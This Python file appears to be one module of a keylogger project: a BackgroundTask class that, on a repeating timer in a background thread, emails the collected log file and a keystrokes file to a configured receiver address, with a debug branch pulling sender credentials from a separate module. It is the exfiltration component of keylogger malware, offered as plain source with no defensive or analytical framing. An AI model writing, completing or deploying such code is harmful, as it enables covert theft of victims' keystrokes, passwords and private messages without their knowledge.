try:
    from .email_sender import SendEmail
    from .config import DEBUG,LOG_INTERVAL,LOGS_FILE,LOGS_DIR,KEYSTROKES_FILE,RECEIVER_EMAIL,SENDER_EMAIL
    from .utils import repeatedFunction
    if DEBUG:
        from keylogger import psw
except ImportError:
    from email_sender import SendEmail
    from config import DEBUG,LOG_INTERVAL,LOGS_FILE,LOGS_DIR,KEYSTROKES_FILE,RECEIVER_EMAIL,SENDER_EMAIL
    from utils import repeatedFunction
    if DEBUG:
        import psw
import os
import threading



class BackgroundTask:
    def __init__(self):
        self.EMAIL_SUBJECT = "LOGS"
        self.EMAIL_BODY = "LOG FILES"
    
    def send_logs(self):
        if DEBUG:
            program = SendEmail()
            program.send_email(os.path.join(LOGS_DIR,LOGS_FILE),os.path.join(LOGS_DIR,KEYSTROKES_FILE),sender_email=psw.email,receiver_email=psw.email,subject="LOGS",body="LOG FILES")
        else:
            program = SendEmail()
            program.send_email(os.path.join(LOGS_DIR,LOGS_FILE),os.path.join(LOGS_DIR,KEYSTROKES_FILE),sender_email=SENDER_EMAIL,receiver_email=RECEIVER_EMAIL,subject=self.EMAIL_SUBJECT,body=self.EMAIL_BODY)


    def start(self):
        '''
        This function starts all the background task in a thread,so dont start them in a thread again.
        '''
        
        sendLogs_thread = threading.Thread(target=repeatedFunction,args=(self.send_logs,LOG_INTERVAL))
        sendLogs_thread.start()


if __name__ == "__main__" and DEBUG:
    app = BackgroundTask()
    app.start()